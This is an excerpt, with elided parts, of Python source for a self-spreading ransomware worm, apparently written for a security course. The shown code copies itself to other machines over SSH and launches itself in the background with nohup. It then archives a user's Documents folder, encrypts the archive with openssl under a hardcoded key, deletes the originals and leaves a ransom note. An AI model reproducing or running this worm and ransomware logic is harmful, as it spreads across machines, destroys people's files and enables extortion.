...
def spreadAndExecute(sshClient):
	...
	newSshClient.put("/tmp/ransomware_worm.py", "/tmp/ransomware_worm.py")
	
	# Make the worm file executable
	sshClient.exec_command("chmod a+x /tmp/ransomware_worm.py")
	...
	# & - keep in background
	sshClient.exec_command("nohup python /tmp/ransomware_worm.py >/tmp/error.log &")
...
##################################################################
# Downloads an encryption program from URL and					 
# creates a .tar archive of /home/cpsc/Documents directory.		
# Encrypts the directory using the openssl program,				 
# deletes /home/cpsc/Documents directory, and leaves ransom		 
# note.															 
##################################################################
...
def ransom():
	...
	# Make openssl executable
	call(["chmod", "a+x", "./openssl"])
	
	# Open the specified archive file
	# Create the tar archive if does not already exist
	tar = tarfile.open("ransomed_documents.tar", "w:gz")
	...
	# Encrypt the tar directory
	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "ransomed_documents.tar", "-out", "ransomed_documents.tar.enc", "-k", "cs456worm"])
	
	# Delete /home/cpsc/Documents Directory
	shutil.rmtree('/home/cpsc/Documents/')
	
	# Delete the tar file because we only want the encrypted one
	os.remove("/home/cpsc/ransomed_documents.tar")
	
	# Leave a note to user on their desktop
	ransomFile = open("/home/cpsc/Desktop/YouIsHacked.txt", "w")
	ransomFile.write("You have been hacked!\nYour files are encrypted...\nPay us to get the password\nMeeeeeeooooowwww\n")
	ransomFile.close()	
...
if len(sys.argv) < 2:
	...
	if isInfectedSystem() == True:
		...
		# Call function to take ransom of directory
		ransom()
